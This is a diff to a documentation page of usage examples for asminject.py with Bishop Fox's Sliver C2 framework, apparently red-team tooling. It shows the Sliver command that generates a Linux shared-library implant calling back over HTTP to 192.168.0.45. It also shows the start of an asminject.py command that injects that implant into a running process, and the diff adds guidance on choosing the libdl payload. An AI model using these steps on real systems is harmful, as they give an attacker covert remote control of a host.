@@ -1,11 +1,13 @@
 # asminject.py examples - Sliver
 Examples related to [Bishop Fox's Sliver C2 framework](https://github.com/BishopFox/sliver)
 
-* [Create and launch a Sliver shared library implant](#create-and-launch-a-sliver-shared-library-implant)
+* [Create and launch a Sliver shared library implant - libdl](#create-and-launch-a-sliver-shared-library-implant-libdl)
 
-## Create and launch a Sliver shared library implant
+## Create and launch a Sliver shared library implant - libdl
 
-Generate a Sliver implant binary for Linux using the shared library format, with the option to run at load enabled:
+If the Linux distribution you're operating in uses a version of `libc` that loads shared libraries by calling the `dlopen` function exported by `libdl` (Debian and its derivatives such as Kali and Ubuntu, etc.), you should use the `dlinject_threaded.s` `asminject.py` payload to inject `.so` files into the target process.
+
+For example, generate a Sliver implant binary for Linux using the shared library format, with the option to run at load enabled:
 
 ```
 [server] sliver > generate --skip-symbols --http 192.168.0.45 --os linux --format shared --run-at-load
@@ -16,7 +18,7 @@ Generate a Sliver implant binary for Linux using the shared library format, with
 [*] Implant saved to /home/user/IMPORTANT_STRANGER.so
 ```
 
-Inject the `dlinject_threaded.s` payload into the target process, e.g.:
+Inject the `dlinject_threaded.s` payload into the target process, e.g. for x86-64:
 
 ```
 # python3 ./asminject.py 93421 dlinject_threaded.s --arch x86-64 \
